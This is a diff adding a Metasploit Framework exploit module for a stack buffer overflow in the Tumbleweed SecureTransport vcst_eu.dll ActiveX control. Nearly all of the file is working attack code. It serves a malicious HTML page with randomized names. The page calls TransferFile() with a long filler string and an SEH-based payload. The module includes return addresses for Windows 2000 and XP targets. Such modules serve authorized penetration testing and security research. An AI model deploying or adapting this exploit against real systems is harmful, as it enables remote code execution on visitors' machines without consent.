@@ -1,0 +1,96 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+require 'msf/core'
+
+module Msf
+
+class Exploits::Windows::Browser::Tumbleweed_FileTransfer< Msf::Exploit::Remote
+
+	include Exploit::Remote::HttpServer::HTML
+	include Exploit::Seh
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Tumbleweed FileTransfer vcst_eu.dll ActiveX Control Buffer Overflow',
+			'Description'    => %q{
+				This module exploits a stack overflow in the vcst_eu.dll
+				FileTransfer Module (1.0.0.5) ActiveX control in the Tumbleweed
+				SecureTransport suite. By sending an overly long string to the
+				TransferFile() 'remotefile' function, an attacker may be able
+				to execute arbitrary code.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         => 'patrick',
+			'Version'        => '$Revision$',
+			'References'     =>
+				[
+					[ 'URL', 'http://www.aushack.com/200708-tumbleweed.txt' ],
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'process',
+				},
+			'Payload'		=>
+				{
+					'Space'		=> 1000,
+					'BadChars'	=> "\x00\x0a\x0d\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0<>()\"\\",
+				},
+			'Platform'		=> 'win',
+			'Targets'		=>
+				[
+					# Patrick - tested successfully against W2KSP0 EN, W2KSP4 EN, XPSP0 EN, 2007/08/17.
+					[ 'Universal vcst_eu.dll',		{ 'Ret' => 0x1001ee75 } ],
+					[ 'Windows 2000 Pro English',   	{ 'Ret' => 0x75022ac4 } ],
+					[ 'Windows XP Pro SP0/SP1 English',	{ 'Ret' => 0x71aa32ad } ],
+				],
+			'DisclosureDate' => '07 Apr 2008',
+			'DefaultTarget' => 0))
+	end
+
+	def on_request_uri(cli, request)
+		# Re-generate the payload
+		return if ((p = regenerate_payload(cli)) == nil)
+
+		# Randomize some things
+		vname		= rand_text_alpha(rand(100) + 1)
+		vurl 		= rand_text_alpha(rand(100) + 1)
+		vhostName	= rand_text_alpha(rand(100) + 1)
+		vlocalFile 	= rand_text_alpha(rand(100) + 1)
+		vMD5	 	= rand_text_alpha(rand(100) + 1)
+
+		# Build the exploit buffer
+		filler = rand_text_alpha(4620)
+		seh = generate_seh_payload(target.ret)
+		sploit = filler + seh
+
+		# Build out the message
+		content = %Q|
+			<html>
+			<object classid="CLSID:38681fbd-d4cc-4a59-a527-b3136db711d3" id="#{vname}"></object>
+			<script language="javascript">
+			#{vname}.TransferFile("#{vurl}", "#{vhostName}", "#{vlocalFile}", "#{sploit}", "#{vMD5}", false, false, 80, false, true, true, 420)
+			</script>
+			</html>
+			|
+
+		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")
+
+		# Transmit the response to the client
+		send_response_html(cli, content)
+
+		# Handle the payload
+		handler(cli)
+	end
+
+end
+end
+
